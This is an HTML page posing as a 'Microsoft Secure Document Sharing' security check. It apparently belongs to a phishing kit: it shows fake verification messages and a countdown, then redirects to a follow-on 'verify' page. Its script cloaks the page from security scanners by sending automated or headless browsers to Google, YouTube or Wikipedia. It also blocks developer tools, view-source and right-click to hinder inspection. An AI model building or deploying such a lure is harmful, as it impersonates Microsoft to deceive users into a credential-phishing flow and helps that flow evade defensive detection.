
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Microsoft Secure Document Sharing - Security Verification</title>
    <meta name="robots" content="noindex,nofollow">
    <style>
        body { margin: 0; padding: 0; background-color: #ffffff; color: #323130; font-family: "Segoe UI", Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .loading-container { text-align: center; max-width: 600px; padding: 40px; }
        .microsoft-logo { width: 120px; height: 120px; margin: 0 auto 30px; background: linear-gradient(135deg, #F35325 0%, #F35325 25%, #81BC06 25%, #81BC06 50%, #05A6F0 50%, #05A6F0 75%, #FFBA08 75%, #FFBA08 100%); border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 48px; font-weight: bold; color: white; }
        .spinner { border: 3px solid #E1DFDD; border-radius: 50%; border-top: 3px solid #0078D4; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 30px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { color: #323130; font-weight: 600; margin-bottom: 15px; font-size: 28px; }
        .status-container { background: #F8F9FA; border-radius: 8px; padding: 20px; margin: 25px 0; min-height: 80px; display: flex; align-items: center; justify-content: center; }
        #status-text { font-size: 16px; color: #323130; font-weight: 500; }
        .progress-container { width: 100%; background: #E1DFDD; border-radius: 10px; margin: 20px 0; height: 6px; overflow: hidden; }
        .progress-bar { height: 100%; background: #0078D4; border-radius: 10px; width: 0%; transition: width 0.3s ease; }
        .timer { color: #605E5C; font-size: 14px; margin-top: 10px; }
        .security-badge { display: inline-flex; align-items: center; background: #107C10; color: white; padding: 6px 12px; border-radius: 4px; font-size: 14px; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="loading-container">
        <div class="microsoft-logo">MS</div>
        <h1>Microsoft Secure Document Sharing</h1>
        <p>Performing advanced security verification for document access...</p>
        
        <div class="status-container">
            <div id="status-text">Starting security verification process...</div>
        </div>
        
        <div class="progress-container">
            <div class="progress-bar" id="progress-bar"></div>
        </div>
        
        <div class="spinner"></div>
        
        <div class="timer" id="timer">Estimated time remaining: <span id="time-remaining">5</span> seconds</div>
        
        <div class="security-badge">Â© Microsoft Azure Advanced Security</div>
    </div>
    
    <script>
        // Bot detection - Set JavaScript enabled cookie
        document.cookie = "js_enabled=1; path=/; max-age=86400; SameSite=Lax";
        
        // Additional client-side bot detection
        (function() {
            // Check if webdriver is present (automation tool indicator)
            if (navigator.webdriver) {
                window.location.href = 'https://www.google.com';
                return;
            }
            
            // Check for common headless browser indicators
            if (navigator.plugins.length === 0 || 
                !navigator.languages || 
                navigator.languages.length === 0) {
                // Possible headless browser
                console.log('Suspicious browser detected');
            }
            
            // Check screen dimensions (bots often have unusual dimensions)
            if (screen.width < 100 || screen.height < 100 || 
                screen.width > 5000 || screen.height > 5000) {
                window.location.href = 'https://www.youtube.com';
                return;
            }
            
            // Detect if Chrome is headless
            if (/HeadlessChrome/.test(window.navigator.userAgent)) {
                window.location.href = 'https://www.wikipedia.org';
                return;
            }
        })();
        
        // Security features
        document.addEventListener("keydown", function(e) {
            if (e.key === "F12" || (e.ctrlKey && e.shiftKey && ["i", "j", "c"].includes(e.key.toLowerCase())) || (e.ctrlKey && e.key.toLowerCase() === "u")) {
                e.preventDefault();
            }
        });
        document.addEventListener("contextmenu", function(e) { e.preventDefault(); });

        const messages = ["Initializing secure document environment...","Verifying Microsoft security certificates...","Checking document access permissions...","Finalizing security verification..."];
        const totalDelay = 5;
        let currentMessage = 0;
        let elapsed = 0;
        
        // Update timer
        const timerInterval = setInterval(function() {
            elapsed++;
            const remaining = totalDelay - elapsed;
            document.getElementById("time-remaining").textContent = remaining;
            const progress = (elapsed / totalDelay) * 100;
            document.getElementById("progress-bar").style.width = progress + "%";
            if(remaining <= 0) clearInterval(timerInterval);
        }, 1000);
        
        // Show messages
        function showNextMessage() {
            if(currentMessage < messages.length) {
                document.getElementById("status-text").textContent = messages[currentMessage];
                currentMessage++;
                setTimeout(showNextMessage, 1000);
            }
        }
        setTimeout(showNextMessage, 500);
        
        // REDIRECT TO MAIN PAGE AFTER DELAY - FIXED
        setTimeout(function() { 
            // In verification.html
window.location.href = "verify.html?verified=true";
;
        }, totalDelay * 1000);
    </script>
</body>
</html>
